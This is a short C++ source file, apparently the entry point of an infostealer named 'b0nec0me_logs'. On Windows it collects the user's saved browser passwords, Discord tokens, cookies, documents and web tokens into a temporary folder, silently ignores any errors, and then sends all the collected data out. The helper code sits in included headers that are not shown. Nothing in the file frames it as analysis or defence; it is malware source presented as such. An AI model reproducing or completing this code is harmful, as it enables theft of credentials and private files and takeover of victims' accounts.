#include <windows.h>
#include <string>

#include "browsers.h"
#include "discord.h"
#include "cookies.h"
#include "files.h"
#include "tokens_web.h"
#include "send.h"
#include "utils.h"

int main() {
    std::string username = get_username();
    std::string tempDir = create_temp_directory("b0nec0me_logs");

    try {
        dump_browser_passwords(tempDir);
        dump_discord_tokens(tempDir);
        dump_cookies(tempDir);
        steal_documents(tempDir);
        dump_web_tokens(tempDir);
    } catch (...) {
    }

    send_all_data(tempDir);

    return 0;
}
